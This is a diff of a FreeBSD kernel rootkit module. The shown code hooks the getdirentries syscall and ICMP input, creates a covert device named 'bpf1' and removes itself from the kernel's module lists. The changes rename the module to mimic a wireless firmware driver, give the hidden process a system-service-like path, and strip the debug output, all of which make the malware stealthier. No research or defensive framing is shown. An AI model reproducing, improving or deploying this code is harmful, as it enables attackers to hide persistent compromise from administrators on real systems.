@@ -39,7 +39,7 @@
 // Module hiding
 
 #include <sys/dirent.h>
-#define MODULE "dad.ko"
+#define MODULE "iwn6060fw.ko"
 
 // Variables to hide modules
 extern linker_file_list_t linker_files;
@@ -61,8 +61,8 @@ struct module {
 };
 
 // new stuff - command buffer, things to hide, direntbuffer, stuff for icmp hooking
-char *T_NAME[] = {"dad.ko", "son", "out.txt"};
-static char *PROC_NAMES[] = {"son"};
+char *T_NAME[] = {"iwn6060fw.ko", "mdconfig3", "out.txt"};
+static char *PROC_NAMES[] = {"/etc/rc.d/mdconfig3"};
 static int PROC_COUNT = 1;
 static char cmd[256+1];
 static struct sx cmd_lock;
@@ -281,7 +281,7 @@ static int hide_kld(void) {
 			(&linker_files)->tqh_first->refs--;
 		}
 
-		// Iterate through linker_files list. If file is dad.ko
+		// Iterate through linker_files list. If file is iwn6060fw.ko
 		// (MODULE), decrement next_file_id and remove from list.
 
 		TAILQ_FOREACH(lf, &linker_files, link) {
@@ -306,9 +306,9 @@ static int hide_kld(void) {
 		mtx_unlock(&Giant);
 
 		MOD_XLOCK;
-		// Now, remove dad.ko from the modules list too.
+		// Now, remove iwn6060fw.ko from the modules list too.
 		TAILQ_FOREACH(mod, &modules, link) {
-			if(strcmp(mod->name, "dad") == 0) {
+			if(strcmp(mod->name, "iwn6060fw.ko") == 0) {
 				nextid--;
 				TAILQ_REMOVE(&modules, mod, link);
 				break;
@@ -319,24 +319,17 @@ static int hide_kld(void) {
 }
 
 static int general_handler(struct thread *td, void *syscall_args) {
-	printf("syscall called");
 	struct process_hiding_args *uap;
 	uap = (struct process_hiding_args *)syscall_args;
 	if (uap->flag == 0)
     {
-		printf("hooking getdirentries\n");
         sysent[SYS_getdirentries].sy_call = (sy_call_t *)getdirentries_hook;   
-		printf("hooked getdirentries, getting cmd_lock mutex\n");
         sx_init(&cmd_lock,"rootkit_lock");
-		printf("got cmd_lock mutex, hooking ICMP\n");
         inetsw[ip_protox[IPPROTO_ICMP]].pr_input = icmp_input_hook;
-		printf("hooked icmp, creating special dev\n");
         sdev = make_dev(&devsw, 0, UID_ROOT, GID_WHEEL, 0600, "bpf1");
-		printf("okbyebye\n");
         hide_kld();
     } else {
 		for (int i = 0; i < PROC_COUNT; i++) {
-			printf("hiding process %d", i);
 			process_hiding(PROC_NAMES[i]);
 		}
 	}
@@ -345,7 +338,7 @@ static int general_handler(struct thread *td, void *syscall_args) {
 }
 
 /* The sysent for the new system call. */
-static struct sysent dad_sysent = {
+static struct sysent iwn6060fw_sysent = {
 	1,			/* number of arguments */
 	general_handler		/* implementing function */
 };
@@ -372,4 +365,4 @@ static int load(struct module *module, int cmd, void *arg) {
 	return(error);
 }
 
-SYSCALL_MODULE(dad, &offset, &dad_sysent, load, 0);
+SYSCALL_MODULE(iwn6060fw, &offset, &iwn6060fw_sysent, load, 0);
